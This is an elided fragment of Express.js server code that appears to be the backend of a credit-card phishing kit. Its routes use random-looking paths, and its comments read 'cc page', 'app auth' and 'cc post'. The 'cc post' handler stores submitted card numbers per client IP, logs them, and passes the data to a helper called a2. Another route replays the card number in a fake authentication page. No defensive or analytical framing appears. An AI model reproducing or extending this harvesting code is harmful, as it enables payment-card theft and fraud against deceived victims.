...
app.get("/3EtpVNHarRb8PqJfArbu",(req,res)=>{ // loading 1:
    res.render("copanegra");
});
app.get("/load",(req,res)=>{ // cc page:
    const{time,url} = req.query;
    res.render("lwipa1",{time,url});
});
...
app.get("/OOMPZ5nz4RnFvFV8s",(req,res)=>{ // app auth:
    ...
    console.log("Card Number app auth: ",req.session.cardNumber[clientIp]);

    res.render("app-auth",{cardNumber:req.session.cardNumber[clientIp]});
});
...
app.post("/v2C8VrVuzY7WzVJv5RB6",(req,res)=>{ // cc post
    ...
    requestIp.getClientIp(req);
    // console.log(data);
    req.session.cardNumber[clientIp] = data.a1;
    console.log("Card Number cc post: ",req.session.cardNumber[clientIp]);
    a2(data,clientIp);
    res.send({OK:true});
});
